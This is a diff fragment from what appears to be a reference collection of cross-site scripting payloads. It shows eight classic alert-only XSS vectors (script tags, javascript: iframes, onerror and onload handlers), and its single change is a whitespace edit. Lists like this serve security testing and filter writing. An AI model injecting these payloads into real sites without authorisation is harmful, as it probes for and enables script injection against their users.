@@ -9,7 +9,7 @@ A complete collection of possible XSS payloads, including raw HTML, encoded payl
 <script>alert('XSS')</script>  
 <iframe src="javascript:alert('XSS')"></iframe>  
 <img src=x onerror=alert(1)>  
-<body onload=alert(1)>  
+<body onload=alert(1)>   
 <svg/onload=alert(1)>  
 <marquee onstart=alert(1)>XSS</marquee>  
 <video><source onerror="alert(1)"></video>  
